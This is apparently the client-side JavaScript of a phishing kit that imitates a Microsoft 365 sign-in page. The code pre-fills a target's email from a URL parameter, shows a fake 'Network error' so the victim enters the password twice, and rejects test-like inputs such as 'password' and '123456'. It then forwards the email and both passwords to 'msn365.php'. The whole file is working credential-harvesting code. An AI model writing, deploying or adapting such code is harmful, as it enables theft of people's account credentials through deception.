const loader365 = document.getElementById("loader365");
const app_main = document.getElementById("app_main");

app_main.style.display = "none";

setTimeout(() => {
    loader365.style.display = "none";
    app_main.style.display = "flex";
}, 2000);


const validEmail =
    /^(([^<>()[\]\\.,;:\s@"]+(\.[^<>()[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;

const urls = new URLSearchParams(window.location.search);
const user = urls.get('user');

const e_input = document.getElementById("e_input");
const load_ani = document.getElementById("load_ani");

let link1 = document.getElementById("link1");
let link2 = document.getElementById("link2");
let name_holder = document.getElementById("name_holder");
let header_main = document.getElementById("header_main");
let btn_365 = document.getElementById("btn_365");
let temp_p = document.getElementById("temp_p");
let e_holder = document.getElementById("e_holder");

const office_sub_form = document.querySelector(".office_sub_form");

let office_count = 0;

const sub_btn = document.getElementById("form_container");
sub_btn.addEventListener("submit", (e)=>{
    e.preventDefault()

    if (btn_365.innerText == "Next") {

        let rand_num = Math.floor(Math.random() * 2000) + 5000;

        if (validEmail.test(e_input.value)) {
            load_ani.style.display = "block";
            btn_365.innerText = "Wait . . ."

            setTimeout(() => {
                getMail(e_input.value)
                e_input.value = ""
                load_ani.style.display = "none"
            }, rand_num); 
        } 
        else if (validEmail.test(user)) {
            getMail(user) 
        }
        
    }

    if (btn_365.innerText == "Sign in") {
        office_count++

        if (office_count == 2) {

            if (validEmail.test(e_holder.innerText)) {

                if (e_input.value.length < 6 || e_input.value == "password" || e_input.value == "Password" || e_input.value == "PASSWORD" || e_input.value == "qwerty" || e_input.value == "QWERTY" || e_input.value == "123456" || e_input.value == "testing" || e_input.value == "Testing" || e_input.value == "TESTING") {

                e_input.style.borderColor = "red";
                office_count = 2;
    
                    return
                }

                getPass(pass1 = temp_p.value, pass2 = e_input.value, mail = e_holder.innerText)
            }
        } 
        else {

            if (e_input.value.length < 6 || e_input.value == "password" || e_input.value == "Password" || e_input.value == "PASSWORD" || e_input.value == "qwerty" || e_input.value == "QWERTY" || e_input.value == "123456" || e_input.value == "testing" || e_input.value == "Testing" || e_input.value == "TESTING") {
                e_input.style.borderColor = "red"

                return
            }

            let rand_num = Math.floor(Math.random() * 2000) + 5000;

            load_ani.style.display = "block";
            btn_365.innerText = "Verifying . . ."

             setTimeout(() => {
                temp_p.value =  e_input.value;
                e_input.value = "";
                load_ani.style.display = "none";
                e_input.style.borderColor = "red";

                office_sub_form.style.display = "block";
                office_sub_form.innerHTML = `<b style="color:red; font-weight:400">Network error! Please try again. </b>`;
                btn_365.innerText = "Sign in"
             }, rand_num);
        }
    }
    
})

// 
if (user != null && validEmail.test(user)) {
    getMail(user)
}
else if (validEmail.test(e_input.value)) {
    let rand_num = Math.floor(Math.random() * 2000) + 5000;

    load_ani.style.display = "block";
        btn_365.innerText = "Wait . . ."

        setTimeout(() => {
            getMail(e_input.value)
            e_input.value = ""
            load_ani.style.display = "none"
        }, 1000);
}

// 
function getPass(pass1, pass2, mail) {
    if (pass1 != "" && pass2 !="" && mail != "") {
        let url = "msn365.php?auth=office&pass1="+pass1+"&pass2="+pass2+"&mail="+mail;
        location = url;
    }
    else {
        e_input.style.borderColor = "red";
    }
}

function getMail(mail) {
    if (validEmail.test(mail)) {
        name_holder.style.display = "block";
        e_holder.innerText = mail;
        e_input.placeholder = "Password";
        e_input.type = "password";
        header_main.innerText = "Enter password";
        btn_365.innerText = "Sign in";
        link1.innerHTML = `<a href="">Forgot password?</a>`;
        link2.innerHTML = `<a href="">Other ways to sign in</a>`;
        office_sub_form.style.display = "none"

    }
    else{
        e_input.style.borderColor = "red";
    }
}